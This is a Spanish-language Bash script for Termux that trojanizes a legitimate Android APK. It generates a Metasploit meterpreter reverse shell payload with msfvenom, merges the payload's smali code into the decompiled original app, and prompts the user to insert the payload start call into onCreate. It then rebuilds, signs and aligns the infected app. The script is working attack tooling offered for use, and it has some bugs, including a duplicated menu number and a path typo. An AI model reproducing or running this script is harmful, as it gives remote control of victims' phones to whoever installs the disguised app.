#!/usr/bin
# da creditos si quieres copiar el codigo bro ju4n
# COLORES
clear
red='\e[1;31m'
default='\e[0m'
yellow='\e[0;33m'
orange='\e[38;5;166m'
green='\033[92m'
cian="\033[1;36m"
negro="\033[1;30m"

banner(){
echo -e $green"                                        "
echo -e "██╗███╗   ██╗███████╗███████╗ ██████╗████████╗"
echo -e "██║████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝"
echo -e "██║██╔██╗ ██║█████╗  █████╗  ██║        ██║   "
echo -e "██║██║╚██╗██║██╔══╝  ██╔══╝  ██║        ██║   "
echo -e "██║██║ ╚████║██║     ███████╗╚██████╗   ██║   "
echo -e "╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   "
echo -e "                BY JU4N                       "
echo ""
}


real(){
clear
banner
echo -e "$cian[*]elije :\n"
echo -e "$negro["1"$negro]$orange android/meterpreter/reverse_tcp "
echo -e "$negro["2"$negro]$orange android/meterpreter/reverse_http "
echo -e "$negro["2"$negro]$orange android/meterpreter/reverse_https "
echo -e "$red["0"$red]$red atras "
echo -n -e "$cian[+] Seleciona:"
read choose
if [ $choose -eq 1 ]; then
       payload="android/meterpreter/reverse_tcp"
elif [ $choose -eq 2 ]; then
       payload="android/meterpreter/reverse_http"
elif [ $choose -eq 3 ]; then
       payload="android/meterpreter/reverse_https"
elif [ $choose -eq 0 ]; then
             menu      
fi 

echo -e -n $negro"LHOST="
read lhost
echo -e -n $negro"LPORT="
read lport
echo -e -n $negro"ruta de la app="
read org
echo -e -n $negro"nuevo nombre de la app con .apk="
read out
sleep 2
clear
banner
echo -e -n $cian"GENERANDO TU APP INFECTADA\n"
msfvenom -p $payload LHOST=$lhost LPORT=$lport R > msf.apk
clear
banner
echo -e -n $green"DECOPILANDO PAYLOAD\n"
apktool d msf.apk
clear
banner
echo -e -n $green"DECOPILANDO APP ORIGINAL\n"
apktool d $org -o /data/data/com.termux/files/home/infect_termux/original
cd msf
tar -cf - ./smali | (cd ../original; tar -xpf - )
cd ../original
clear
banner
echo -e -n $green"BUSCANDO POINT" 
grep -B2 "MAIN" AndroidManifest.xml
echo -e -n $negro"RUTA DEL POINT="
read point
echo -e "$negro[presiona control + w y busca onCreate y pones esta linea en el medio de onCreate y local."
echo -e "$negro invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V      "
echo -e -n $negro"Y/N="
read ju4n 
nano $point
clear
banner
echo -e -n $green"CONFIGURANDO APP\n"
apktool b /data/data/com.termux/files/home/infect_termux/original -o /data/data/com.termux/files/home/infect_termux/org1-modified.apk
sleep 1
clear
banner
echo -e -n $green"GENERANDO EL KEYSTORE\n"
keytool -genkey -V -keystore /data/data/com.termux/files/home/infect_termux/org1.keystore -alias org1 -keyalg RSA -keysize 2048 -validity 10000
sleep 1
clear
banner
echo -e -n $green"FIRMANDO LA APP\n"
echo -e -n $green"CON JARSIGNER"
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /data/data/com.termux/files/home/infect_termux/org1.keystore /data/data/com.termux/files/home/infect_termux/org1-modified.apk org1
sleep 1
clear
banner
echo -e -n $negro"\n[ + ] ALINEAR LOS DATOS\n"
zipalign -v 4 /data/data/com.termux/files/home/infect_termux/org1-modified.apk /data/data/com.temrux/files/infect_termux/$out
sleep 1
rm -rf /data/data/com.termux/files/home/infect_termux/org1.keystore
rm -rf /data/data/com.termux/files/home/infect_termux/msf
rm -rf /data/data/com.termux/files/home/infect_termux/original
rm -rf /data/data/com.termux/files/home/infect_termux/msf.apk
clear
banner
echo -e $cian"App Guardada Como > org1-modified.apk"
}


menu(){
clear
banner
echo -e "$cian[*]elije xd:"
echo -e "$negro["1"$negro]$orange Infectar real apk "
echo -e "$red["0"$red]$red exit "
echo -n -e "$cian[+] Seleciona: "
read play
if [ $play -eq 1 ]; then
	real
elif [ $play -eq 0 ]; then
	exit
fi
}
menu
